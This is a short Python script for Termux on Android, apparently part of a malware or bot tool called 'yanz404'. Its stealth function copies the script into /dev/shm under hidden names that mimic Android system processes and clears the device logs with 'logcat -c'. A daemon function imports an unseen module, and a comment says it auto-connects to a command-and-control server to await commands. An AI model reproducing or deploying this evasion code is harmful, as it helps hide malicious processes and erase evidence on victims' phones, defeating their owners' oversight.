#!/data/data/com.termux/files/usr/bin/python3
import os
import time
import random

# Hide process and files
def stealth_mode():
    # Randomize process name
    random_names = ['com.android.system', 'com.google.input', 'system_server']
    os.system(f"cp yanz404.py /dev/shm/.{random.choice(random_names)}")
    
    # Run from temporary location
    os.chdir('/dev/shm/')
    
    # Clear logs periodically
    os.system("logcat -c 2>/dev/null")

# Background daemon
def run_as_daemon():
    import daemon
    with daemon.DaemonContext():
        from yanz404_mobile import YanzMobile
        yanz = YanzMobile()
        # Auto-connect to C2 and wait for commands
        while True:
            time.sleep(60)

if __name__ == "__main__":
    stealth_mode()
